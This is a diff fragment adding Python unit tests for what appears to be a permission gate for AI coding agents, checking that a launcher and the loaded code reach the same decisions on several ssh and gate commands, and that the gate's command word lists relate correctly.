+
+    def test_the_launcher_gives_the_same_answers_as_the_code_it_loads(self):
+        write_table(self.config)
+        self.granted(commands=["remote-run"], machines=["build-1", "gpu-1", "batch-1", "svc"], handover=["code"])
+        for command in ("ssh gpu-alias make", "ssh gpu-1 make", "ssh batch-login make", "ssh svc ls",
+                        self.gate("measure build-1"), self.gate("remote batch-1 -- make"),
+                        self.gate("service svc --prompt-file tools/p.md")):
+            for runtime in ("claude", "codex"):
+                for event in ("pre-tool-use", "permission-request"):
+                    with self.subTest(runtime=runtime, command=command, event=event):
+                        call = self.shell(runtime, command)
+                        self.assertEqual(self.decide(runtime, call, event=event, process=True),
+                                         self.decide(runtime, call, event=event))
+
+    def test_the_resource_words_are_the_gates_subcommands(self):
+        self.assertLessEqual(set(ddl_gate.RESOURCE_WORDS) | {"resources"}, set(ddl_gate.RUN_WORDS))
+        self.assertIn("resources", ddl_gate.GATE_WORDS)
+        self.assertFalse(set(ddl_gate.RESOURCE_WORDS) & set(ddl_gate.GATE_WORDS))  # those need their class
 
 
 class LedgerTest(ReportFlowTest):
